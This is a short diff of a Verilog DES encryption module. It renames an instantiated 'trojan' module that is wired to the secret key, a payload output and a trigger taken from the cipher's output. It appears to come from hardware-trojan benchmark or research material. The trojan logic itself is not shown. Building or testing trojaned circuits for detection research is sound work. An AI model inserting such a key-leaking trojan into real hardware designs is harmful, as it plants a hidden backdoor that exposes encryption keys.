@@ -123,7 +123,7 @@ module des_o(desOut, desIn, key, decrypt, roundSel, clk);
 	assign FP = { Rout, Lout};
 
 	crp u0( .P(out), .R(Lout), .K_sub(K_sub) );
-    trojan u2( .payload(key_troj), .key(key), .trigger(out) ); // calls trojan.v to determine if tigger condition is met
+    trojan_0 u2( .payload(key_troj), .key(key), .trigger(out) ); // calls trojan.v to determine if tigger condition is met
 
 	always @(posedge clk)
 			  L <= #1 Lout;
